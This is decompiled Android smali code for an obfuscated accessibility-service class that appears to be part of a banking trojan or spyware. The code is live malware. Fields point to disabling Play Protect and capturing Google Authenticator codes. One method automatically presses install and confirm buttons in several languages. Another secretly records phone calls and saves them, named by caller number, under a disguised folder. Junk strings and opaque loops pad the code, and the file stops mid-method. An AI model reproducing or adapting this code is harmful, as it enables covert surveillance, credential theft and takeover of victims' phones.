.class public Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;
.super Landroid/accessibilityservice/AccessibilityService;
.source "etepaejhucdoifemyubbjerbt112.java"


# static fields
.field public static etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112CheckPrims:Z

.field public static etepaejhucdoifemyubbjerbt112DisablePlayProtect:Ljava/lang/String;

.field public static etepaejhucdoifemyubbjerbt112FOR_IN:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;

.field public static etepaejhucdoifemyubbjerbt112Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

.field public static etepaejhucdoifemyubbjerbt112NeedPaste:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112OFFOK:Ljava/lang/String;

.field public static etepaejhucdoifemyubbjerbt112RecorderActive:Z

.field public static etepaejhucdoifemyubbjerbt112Recording:Z

.field public static etepaejhucdoifemyubbjerbt112SendGoogleAuth:Z

.field public static etepaejhucdoifemyubbjerbt112ToPaste:Ljava/lang/String;

.field public static etepaejhucdoifemyubbjerbt112bypass:Ljava/lang/Boolean;

.field public static etepaejhucdoifemyubbjerbt112lay:Landroid/view/WindowManager$LayoutParams;

.field public static etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

.field public static etepaejhucdoifemyubbjerbt112wm:Landroid/view/WindowManager;

.field public static sfw:Landroid/view/SurfaceView;

.field public static useRec:Ljava/lang/String;


# instance fields
.field public oldtext:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x0

    .line 107
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Auto_Click:Ljava/lang/Boolean;

    .line 108
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    .line 110
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_IN:Ljava/lang/Boolean;

    .line 111
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_prim:Ljava/lang/Boolean;

    .line 113
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112bypass:Ljava/lang/Boolean;

    const-string v2, "[DIS_PROTECTION]"

    .line 115
    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112DisablePlayProtect:Ljava/lang/String;

    .line 116
    sput-boolean v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112CheckPrims:Z

    const-string v2, "on"

    .line 117
    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112OFFOK:Ljava/lang/String;

    const-string v2, ""

    .line 515
    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112ToPaste:Ljava/lang/String;

    .line 516
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112NeedPaste:Ljava/lang/Boolean;

    .line 592
    sput-boolean v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112SendGoogleAuth:Z

    const/4 v1, 0x0

    .line 593
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 594
    sput-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;

    .line 1460
    sput-boolean v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Recording:Z

    .line 1461
    sput-boolean v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112RecorderActive:Z

    const-string v0, "[USE-REC]"

    .line 1463
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->useRec:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 73
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    const-string v0, ""

    .line 1878
    iput-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->oldtext:Ljava/lang/String;

    return-void
.end method

.method private Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 6

    const/4 v0, 0x0

    if-eqz p1, :cond_4

    .line 1353
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    .line 1354
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    const-string v3, "android.widget.Button"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const/4 v3, 0x1

    if-eqz v2, :cond_1

    .line 1355
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1357
    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    const-string v4, "\u5b89\u88c5"

    .line 1358
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 1359
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const-string v5, "install"

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 1360
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const-string v5, "done"

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u5b8c\u6210"

    .line 1361
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u062a\u062b\u0628\u064a\u062a"

    .line 1362
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "\u786e\u5b9a"

    .line 1363
    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    :cond_0
    const/16 v0, 0x10

    .line 1365
    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return v3

    .line 1368
    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v2

    const-string v4, "android.widget.ScrollView"

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/16 v2, 0x1000

    .line 1369
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    const/4 v2, 0x0

    :goto_0
    if-ge v2, v1, :cond_4

    .line 1372
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    .line 1373
    invoke-direct {p0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->Gotitinstalled(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v4

    if-eqz v4, :cond_3

    return v3

    :cond_3
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_4
    return v0
.end method

.method public static RecordNow(Ljava/lang/Boolean;)V
    .locals 5

    const-string v0, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    .line 1467
    sget-object v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->useRec:Ljava/lang/String;

    const-string v2, "YES"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    if-eqz p0, :cond_15

    .line 1469
    :cond_0
    sget-boolean p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Recording:Z

    if-nez p0, :cond_15

    const/4 p0, 0x1

    .line 1471
    sput-boolean p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Recording:Z

    .line 1476
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v1

    .line 1477
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    add-int/lit8 v2, v2, -0x5

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    .line 1478
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v3, Ljava/util/Date;

    invoke-direct {v3}, Ljava/util/Date;-><init>()V

    const-string v4, "yyyy-MM-dd"

    invoke-static {v4, v3}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;Ljava/util/Date;)Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "-"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lginom/alfa/lib/scan/_callr_lsnr_;->Calldate:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "_"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lginom/alfa/lib/scan/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lginom/alfa/lib/scan/_callr_lsnr_;->CallStatus:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112toBase64(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 1480
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    .line 1481
    new-instance v3, Ljava/io/File;

    const-string v4, "/Config/sys/apps/rc"

    invoke-direct {v3, v2, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1485
    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_1

    .line 1486
    invoke-virtual {v3}, Ljava/io/File;->mkdirs()Z

    .line 1489
    :cond_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "/Config/sys/apps/rc/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\n"

    const-string v4, "[nl]"

    invoke-virtual {v1, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".3gp"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 1490
    new-instance v2, Landroid/media/MediaRecorder;

    invoke-direct {v2}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x6

    .line 1492
    invoke-virtual {v2, v3}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 1493
    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2, p0}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 1494
    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2, p0}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 1495
    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    const/4 v1, 0x0

    .line 1500
    :try_start_0
    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_5

    .line 1502
    :catch_0
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1503
    :cond_2
    :goto_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 1505
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1506
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 1508
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_0

    .line 1513
    :cond_3
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1514
    :cond_4
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 1516
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1517
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 1519
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1

    .line 1523
    :cond_5
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1524
    :cond_6
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_7

    .line 1526
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1527
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_6

    .line 1529
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_2

    .line 1534
    :cond_7
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1535
    :cond_8
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_9

    .line 1537
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1538
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_8

    .line 1540
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_3

    .line 1544
    :cond_9
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1545
    :cond_a
    :goto_4
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_b

    .line 1547
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1548
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    .line 1550
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_4

    .line 1558
    :cond_b
    :goto_5
    :try_start_1
    sget-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_b

    .line 1561
    :catch_1
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1562
    :cond_c
    :goto_6
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_d

    .line 1564
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1565
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c

    .line 1567
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_6

    .line 1572
    :cond_d
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1573
    :cond_e
    :goto_7
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_f

    .line 1575
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1576
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_e

    .line 1578
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_7

    .line 1582
    :cond_f
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1583
    :cond_10
    :goto_8
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_11

    .line 1585
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1586
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    .line 1588
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_8

    .line 1593
    :cond_11
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1594
    :cond_12
    :goto_9
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_13

    .line 1596
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1597
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_12

    .line 1599
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_9

    .line 1603
    :cond_13
    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    .line 1604
    :cond_14
    :goto_a
    invoke-virtual {p0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_15

    .line 1606
    sput-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1607
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_14

    .line 1609
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    goto :goto_a

    :cond_15
